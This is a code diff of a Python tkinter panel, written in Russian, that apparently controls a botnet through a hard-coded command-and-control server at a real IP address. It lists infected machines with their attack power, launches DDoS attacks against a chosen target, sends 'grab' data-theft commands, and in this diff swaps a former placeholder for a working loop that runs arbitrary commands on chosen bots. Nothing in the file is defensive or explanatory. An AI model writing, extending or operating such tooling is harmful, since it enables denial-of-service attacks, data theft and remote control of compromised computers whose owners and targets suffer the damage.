@@ -1,13 +1,10 @@
 import tkinter as tk
 from tkinter import ttk, messagebox, scrolledtext, simpledialog
-import threading
-import socket
-import json
-import time
+import threading, socket, json, time
 
-class BotnetTab(tk.Frame):
+class BotnetTab(ttk.Frame):
     def __init__(self, parent, app=None):
-        super().__init__(parent, bg="#f0f0f0")
+        super().__init__(parent)
         self.app = app
         self.c2_host = "80.249.146.202"
         self.c2_port = 80
@@ -21,21 +18,15 @@ class BotnetTab(tk.Frame):
         self.after(5000, self._auto_refresh)
 
     def create_widgets(self):
-        ctrl = tk.Frame(self, bg=self.colors["bg"])
+        ctrl = ttk.Frame(self)
         ctrl.pack(fill=tk.X, padx=5, pady=5)
-        tk.Button(ctrl, text="Обновить список", command=self.refresh_bots,
-                  bg=self.colors["button_bg"]).pack(side=tk.LEFT, padx=2)
-        tk.Button(ctrl, text="Атака на выбранных", command=self.launch_attack,
-                  bg=self.colors["button_bg"]).pack(side=tk.LEFT, padx=2)
-        tk.Button(ctrl, text="Граб выбранных", command=self.launch_grab,
-                  bg=self.colors["button_bg"]).pack(side=tk.LEFT, padx=2)
-        tk.Button(ctrl, text="Стоп выбранных", command=self.stop_selected,
-                  bg=self.colors["button_bg"], fg="red").pack(side=tk.LEFT, padx=2)
-        tk.Button(ctrl, text="Массовая команда", command=self.show_cmd_dialog,
-                  bg=self.colors["button_bg"]).pack(side=tk.LEFT, padx=2)
+        ttk.Button(ctrl, text="Обновить список", command=self.refresh_bots).pack(side=tk.LEFT, padx=2)
+        ttk.Button(ctrl, text="Атака на выбранных", command=self.launch_attack).pack(side=tk.LEFT, padx=2)
+        ttk.Button(ctrl, text="Граб выбранных", command=self.launch_grab).pack(side=tk.LEFT, padx=2)
+        ttk.Button(ctrl, text="Стоп выбранных", command=self.stop_selected).pack(side=tk.LEFT, padx=2)
+        ttk.Button(ctrl, text="Массовая команда", command=self.show_cmd_dialog).pack(side=tk.LEFT, padx=2)
 
-        # Таблица ботов
-        tree_frame = tk.Frame(self, bg=self.colors["bg"])
+        tree_frame = ttk.Frame(self)
         tree_frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
         columns = ("ip", "hostname", "os", "cpu", "ram", "status", "rps", "last_seen")
         self.tree = ttk.Treeview(tree_frame, columns=columns, show="headings", selectmode="extended")
@@ -47,23 +38,20 @@ class BotnetTab(tk.Frame):
         self.tree.configure(yscrollcommand=scrollbar.set)
         scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
 
-        # Статистика
-        stat = tk.Frame(self, bg=self.colors["bg"])
+        stat = ttk.Frame(self)
         stat.pack(fill=tk.X, padx=5, pady=5)
-        self.lbl_total = tk.Label(stat, text="Всего: 0", bg=self.colors["bg"])
+        self.lbl_total = ttk.Label(stat, text="Всего: 0")
         self.lbl_total.pack(side=tk.LEFT, padx=10)
-        self.lbl_online = tk.Label(stat, text="Онлайн: 0", bg=self.colors["bg"])
+        self.lbl_online = ttk.Label(stat, text="Онлайн: 0")
         self.lbl_online.pack(side=tk.LEFT, padx=10)
-        self.lbl_power = tk.Label(stat, text="Суммарная мощность: 0 RPS", bg=self.colors["bg"])
+        self.lbl_power = ttk.Label(stat, text="Суммарная мощность: 0 RPS")
         self.lbl_power.pack(side=tk.LEFT, padx=10)
 
-        # Консоль команд
-        cmd_frame = tk.LabelFrame(self, text="Команда ботам", bg=self.colors["bg"])
+        cmd_frame = ttk.LabelFrame(self, text="Команда ботам")
         cmd_frame.pack(fill=tk.X, padx=5, pady=5)
-        self.cmd_entry = tk.Entry(cmd_frame, width=50)
+        self.cmd_entry = ttk.Entry(cmd_frame, width=50)
         self.cmd_entry.pack(side=tk.LEFT, padx=5, pady=5)
-        tk.Button(cmd_frame, text="Отправить", command=self.send_custom_command,
-                  bg=self.colors["button_bg"]).pack(side=tk.LEFT, padx=2)
+        ttk.Button(cmd_frame, text="Отправить", command=self.send_custom_command).pack(side=tk.LEFT, padx=2)
         self.output_text = scrolledtext.ScrolledText(cmd_frame, height=6, bg="white")
         self.output_text.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
 
@@ -87,8 +75,6 @@ class BotnetTab(tk.Frame):
                     break
                 data += chunk
             sock.close()
-            if not data:
-                raise ValueError("Empty response")
             bots = json.loads(data)
             self.bots = {bot["ip"]: bot for bot in bots if bot.get("ip")}
             self._update_tree(bots)
@@ -103,27 +89,18 @@ class BotnetTab(tk.Frame):
         for bot in bots:
             if bot.get("ip") == "77.79.168.92":
                 continue
-            values = (
-                bot.get("ip", ""),
-                bot.get("hostname", ""),
-                bot.get("os", ""),
-                bot.get("cpu", ""),
-                bot.get("ram", ""),
-                bot.get("status", "offline"),
-                bot.get("rps", 0),
-                bot.get("last_seen", "")
-            )
+            values = (bot["ip"], bot.get("hostname",""), bot.get("os",""),
+                      bot.get("cpu",""), bot.get("ram",""), bot.get("status",""),
+                      bot.get("rps",0), bot.get("last_seen",""))
             self.tree.insert("", "end", values=values)
             if bot.get("status") == "online":
                 online += 1
-            total_rps += int(bot.get("rps", 0))
+            total_rps += int(bot.get("rps",0))
         self.lbl_total.config(text=f"Всего: {total}")
         self.lbl_online.config(text=f"Онлайн: {online}")
         self.lbl_power.config(text=f"Суммарная мощность: {total_rps} RPS")
 
-    # === Отправка команд на C2 ===
     def _send_raw(self, msg):
-        """Отправляет строку на C2 и возвращает ответ."""
         try:
             sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             sock.settimeout(5)
@@ -133,7 +110,7 @@ class BotnetTab(tk.Frame):
             sock.close()
             return resp
         except Exception as e:
-            messagebox.showerror("Ошибка", f"Не удалось отправить команду: {e}")
+            messagebox.showerror("Ошибка", str(e))
             return None
 
     def launch_attack(self):
@@ -142,19 +119,14 @@ class BotnetTab(tk.Frame):
             messagebox.showwarning("Ошибка", "Выберите ботов")
             return
         target = simpledialog.askstring("Цель", "URL/IP цели:")
-        if not target:
-            return
+        if not target: return
         method = simpledialog.askstring("Метод", "Метод атаки (GET, POST, CFB, ...):", initialvalue="GET")
-        if not method:
-            return
+        if not method: return
         threads = simpledialog.askinteger("Потоки", "Количество потоков:", initialvalue=100)
-        if threads is None:
-            return
+        if threads is None: return
         bot_ips = [self.tree.item(i, "values")[0] for i in selected]
         cmd_str = f"attack:{target}|{method}|{threads}|{','.join(bot_ips)}"
-        resp = self._send_raw(cmd_str)
-        if resp:
-            messagebox.showinfo("Атака", f"Команда отправлена на {len(bot_ips)} ботов. Ответ: {resp.decode()}")
+        self._send_raw(cmd_str)
 
     def launch_grab(self):
         selected = self.tree.selection()
@@ -162,10 +134,7 @@ class BotnetTab(tk.Frame):
             messagebox.showwarning("Ошибка", "Выберите ботов")
             return
         bot_ips = [self.tree.item(i, "values")[0] for i in selected]
-        cmd_str = f"grab:{','.join(bot_ips)}"
-        resp = self._send_raw(cmd_str)
-        if resp:
-            messagebox.showinfo("Граб", f"Команда отправлена на {len(bot_ips)} ботов. Ответ: {resp.decode()}")
+        self._send_raw(f"grab:{','.join(bot_ips)}")
 
     def stop_selected(self):
         selected = self.tree.selection()
@@ -173,26 +142,20 @@ class BotnetTab(tk.Frame):
             messagebox.showwarning("Ошибка", "Выберите ботов")
             return
         bot_ips = [self.tree.item(i, "values")[0] for i in selected]
-        cmd_str = f"stop:{','.join(bot_ips)}"
-        resp = self._send_raw(cmd_str)
-        if resp:
-            messagebox.showinfo("Стоп", f"Команда отправлена на {len(bot_ips)} ботов. Ответ: {resp.decode()}")
+        self._send_raw(f"stop:{','.join(bot_ips)}")
 
     def send_custom_command(self):
-        """Отправляет произвольную команду (exec:...)"""
         cmd = self.cmd_entry.get().strip()
         if not cmd:
             messagebox.showwarning("Ошибка", "Введите команду")
             return
-        # Если команда не содержит ':', считаем что это exec на всех выбранных
         selected = self.tree.selection()
         if not selected:
-            messagebox.showwarning("Ошибка", "Выберите ботов для команды")
+            messagebox.showwarning("Ошибка", "Выберите ботов")
             return
         ips = [self.tree.item(i, "values")[0] for i in selected]
-        # Отправляем как exec:bot_ip:payload (или просто exec:payload, если C2 так умеет)
-        # В нашем C2 поддержки exec нет, но можно добавить. Пока заглушка.
-        messagebox.showinfo("Команда", f"Отправка '{cmd}' на {len(ips)} ботов (функция в разработке)")
+        for ip in ips:
+            self._send_raw(f"exec:{ip}:{cmd}")
 
     def show_cmd_dialog(self):
         self.cmd_entry.focus_set()
